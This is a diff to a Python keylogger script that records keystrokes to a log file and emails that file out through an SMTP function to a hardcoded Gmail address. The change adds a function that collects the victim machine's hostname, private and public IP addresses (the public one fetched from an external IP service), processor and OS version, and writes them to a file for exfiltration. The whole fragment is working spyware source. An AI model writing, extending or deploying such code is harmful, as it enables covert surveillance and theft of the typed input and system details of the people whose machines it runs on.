@@ -27,6 +27,7 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 key_info = r"/key_log.txt"
+system_info = "sys_details.txt"
 log_dir = r"/Users/kenluong/Developer/python/"
 
 email_addr = "anteikuu20@gmail.com"
@@ -77,3 +78,22 @@ def send_email(filename, attachment, toaddr):
     server.quit()
 
 send_email(key_info, log_dir + key_info, toaddr)
+
+def system_details():
+    with open(log_dir + system_info, "a") as f:
+        hostname = socket.gethostname()
+        ip_addr = socket.gethostbyname(hostname)
+        try:
+            ip_public = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + ip_public + "\n")
+
+        except Exception:
+            f.write("Failed to retrieve Public IP Address\n")
+
+        f.write("Processor: " + platform.processor() + "\n")
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + ip_addr + "\n")
+
+system_details()
